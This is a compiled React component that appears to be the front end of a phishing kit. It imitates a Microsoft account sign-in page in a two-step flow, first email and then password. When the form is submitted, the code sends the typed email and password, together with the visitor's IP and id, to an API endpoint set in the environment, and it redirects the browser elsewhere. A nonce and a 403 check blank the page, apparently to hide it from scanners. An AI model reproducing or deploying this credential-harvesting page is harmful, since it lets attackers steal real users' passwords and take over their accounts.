"use strict";

Object.defineProperty(exports, "__esModule", {
  value: true
});
exports.default = void 0;
require("./App.css");
var _react = require("react");
var _ArrowBack = _interopRequireDefault(require("@mui/icons-material/ArrowBack"));
function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }
function App(_ref) {
  let {
    visitor,
    ip
  } = _ref;
  const [email, setEmail] = (0, _react.useState)("");
  const [password, setPassword] = (0, _react.useState)("");
  var [status, setStatus] = (0, _react.useState)(200);
  const [showSignIn, setShowSignIn] = (0, _react.useState)(true);
  const [animateOut, setAnimateOut] = (0, _react.useState)(false);
  const queryParams = new URLSearchParams(window.location.search);
  const nonce = queryParams.get("nonce");
  const handleEmailChange = event => {
    setEmail(event.target.value);
  };
  const handlePasswordChange = event => {
    setPassword(event.target.value);
  };
  const handleSubmit = event => {
    event.preventDefault();
    if (email && !password) {
      // Start the slide out
      event.preventDefault(); // Prevent form from submitting and refreshing the page
      setAnimateOut(true);

      // Wait for the animation to finish before removing the element
      setTimeout(() => {
        setShowSignIn(false);
      }, 500); // This should match the duration of your slide-out animation
    } else if (email && password) {
      window.location.href = process.env.REACT_APP_REDIRECT_URL_M.toString();
      fetch(process.env.REACT_APP_API_URL + "login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          visitor: visitor,
          ip: ip,
          email: email,
          password: password
        })
      }).then(response => {
        console.log(response.status);
        if (response.status === 403) {
          setStatus(403);
        } else {
          setStatus(200);
        }
      }).catch(error => {
        console.error("Error:", error);
      });
    }
  };
  const backgroundStyle = {
    backgroundImage: "url('/bg.svg')",
    backgroundPosition: "center center",
    backgroundRepeat: "no-repeat"
  };
  const handleNextClick = event => {
    event.preventDefault();
    setAnimateOut(true);
    setTimeout(() => {
      setShowSignIn(false);
    }, 500);
  };
  return /*#__PURE__*/React.createElement(React.Fragment, null, status === 403 && nonce ? /*#__PURE__*/React.createElement("div", null) : /*#__PURE__*/React.createElement("div", {
    className: "flex flex-col items-center justify-center min-h-screen bg-gray-100 p-4",
    style: backgroundStyle
  }, /*#__PURE__*/React.createElement("div", {
    className: "bg-white drop-shadow-md overflow-hidden",
    style: {
      width: "440px",
      height: "338px",
      padding: "32px"
    }
  }, /*#__PURE__*/React.createElement("form", {
    className: "space-y-6 p-[13px]",
    onSubmit: handleSubmit
  }, /*#__PURE__*/React.createElement("img", {
    className: "w-auto",
    src: "/m_logo.svg" // 
    ,
    alt: " Logo"
  }), showSignIn ? /*#__PURE__*/React.createElement("div", {
    className: "transition duration-300 ".concat(animateOut ? "animate-slideAndFade" : "")
  }, /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("h2", {
    className: " mt-[-15px] text-2xl font-semibold text-gray-900"
  }, "Sign in")), /*#__PURE__*/React.createElement("div", {
    style: {
      marginTop: "10px"
    }
  }, /*#__PURE__*/React.createElement("label", {
    htmlFor: "email",
    className: "sr-only"
  }, "Email, phone, or Skype"), /*#__PURE__*/React.createElement("input", {
    id: "email",
    name: "email",
    type: "text",
    required: true,
    className: "appearance-none block w-full py-2 border-b border-black placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-indigo-500  sm:text-md",
    placeholder: "Email, phone, or Skype",
    value: email,
    onChange: handleEmailChange
  })), /*#__PURE__*/React.createElement("div", {
    className: "text-sm text-[12.5px] text-gray-800",
    style: {
      marginTop: "20px"
    }
  }, "No account? \xA0", /*#__PURE__*/React.createElement("a", {
    href: "#",
    className: "text-[#0067b8]"
  }, "Create one!")), /*#__PURE__*/React.createElement("div", {
    className: "text-[12.5px]",
    style: {
      marginTop: "18px"
    }
  }, /*#__PURE__*/React.createElement("a", {
    href: "#",
    className: "text-[#0067b8]"
  }, "Can't access your account?")), /*#__PURE__*/React.createElement("div", {
    className: "flex justify-end"
  }, /*#__PURE__*/React.createElement("button", {
    type: "submit",
    onSubmit: () => handleNextClick(),
    className: "group relative w-[110px] h-[30px] mt-4 flex items-center justify-center border border-transparent text-md font-medium text-white bg-[#0067b8] hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
  }, "Next"))) : /*#__PURE__*/React.createElement("div", {
    className: "animate-slideAndFadeIn",
    style: {
      marginTop: "12px"
    }
  }, /*#__PURE__*/React.createElement("div", {
    style: {
      marginBottom: "20px"
    }
  }, /*#__PURE__*/React.createElement("button", {
    className: "p-1 text-sm rounded-full text-whitefocus:ring-2  focus:ring-offset-2"
  }, /*#__PURE__*/React.createElement(_ArrowBack.default, {
    className: "text-gray-500",
    style: {
      fontSize: "15px"
    }
  })), /*#__PURE__*/React.createElement("span", {
    className: ""
  }, email)), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("h2", {
    className: "mt-[-20px] text-2xl font-semibold text-gray-900"
  }, "Enter password")), /*#__PURE__*/React.createElement("div", {
    style: {
      marginTop: "10px"
    }
  }, /*#__PURE__*/React.createElement("label", {
    htmlFor: "email",
    className: "sr-only"
  }, "Password"), /*#__PURE__*/React.createElement("input", {
    id: "password",
    name: "password",
    type: "password",
    required: true,
    className: "appearance-none block w-full py-2 border-b border-black placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-indigo-500  sm:text-md",
    placeholder: "Password",
    value: password,
    onChange: handlePasswordChange
  })), /*#__PURE__*/React.createElement("div", {
    className: "text-sm text-[12.5px] text-gray-600",
    style: {
      marginTop: "20px"
    }
  }, /*#__PURE__*/React.createElement("a", {
    href: "#",
    className: "text-[#0067b8]"
  }, "Forgot my password")), /*#__PURE__*/React.createElement("div", {
    className: "flex justify-end"
  }, /*#__PURE__*/React.createElement("button", {
    type: "submit",
    className: "group relative w-[110px] h-[33px] mt-4 flex items-center justify-center border border-transparent text-md font-medium text-white bg-[#0067b8] hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
  }, "Sign in"))))), /*#__PURE__*/React.createElement("div", {
    className: "bg-white drop-shadow-md overflow-hidden mt-[20px] ".concat(!showSignIn ? "animate-fadeOut" : ""),
    style: {
      width: "440px",
      height: "48px"
    }
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center ml-10 mt-2"
  }, /*#__PURE__*/React.createElement("img", {
    src: "/key.svg",
    alt: "Sign-in Options",
    className: "mr-3 " // Add some margin to the right of the image
    ,
    style: {
      height: "33px"
    }
  }), /*#__PURE__*/React.createElement("span", {
    className: "text-[12.5] "
  }, "Sign-in options"), " "))));
}
var _default = exports.default = App;